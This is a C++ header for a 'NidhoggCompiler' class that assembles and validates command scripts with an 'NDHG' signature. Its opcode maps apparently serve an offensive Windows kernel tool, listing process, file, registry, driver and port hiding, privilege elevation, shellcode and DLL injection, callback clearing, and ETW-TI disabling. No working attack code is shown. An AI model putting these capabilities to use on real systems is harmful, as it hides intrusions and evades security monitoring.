#pragma once
#include "pch.h"
#include "Parser.hpp"
#include "Parsers.h"

// NDHG signature.
constexpr byte SIGNATURE[] = { 0x4e, 0x44, 0x48, 0x47 };

// Length of signature + amount of commands + first command opcode + size of args.
constexpr size_t MINIMUM_FILE_SIZE = sizeof(SIGNATURE) + 3;
constexpr size_t FIRST_COMMAND_OFFSET = sizeof(SIGNATURE) + 1;
constexpr uint16_t INVALID_COMMAND_TYPE = 0xFF;

class NidhoggCompiler
{
private:
	std::vector<Parser*> parsers;
	std::unordered_map<std::string, Parser*> parsersMap;
	std::vector<std::string> commands;

	std::unordered_map<uint16_t, std::string> reverseOpcodeMap = {
		{0, "process"},
		{1, "thread"},
		{2, "module"},
		{3, "driver"},
		{4, "file"},
		{5, "reg"},
		{6, "patch"},
		{7, "shinject"},
		{8, "dllinject"},
		{9, "callbacks"},
		{10, "etwti"},
		{11, "port"}
	};
	
	// Option name | opcode.
	std::unordered_map<std::string, uint16_t> options = {
		{"add", 0},
		{"remove", 1},
		{"enable", 0},
		{"disable", 1},
		{"clear", 2},
		{"hide", 3},
		{"unhide", 4},
		{"elevate", 5},
		{"signature", 6},
		{"apc", 7},
		{"thread", 8},
		{"restore", 0}
	};

	uint16_t GetCommandType(std::string command);
	std::vector<std::string> GetArgs(std::string command);
	bool ValidateCommand(std::vector<byte> data, size_t index, DWORD* outOffset);

public:
	NidhoggCompiler(std::string filePath);
	~NidhoggCompiler();
	bool Assemble(std::string outputPath);
	bool Validate(std::string assembledFilePath);
};
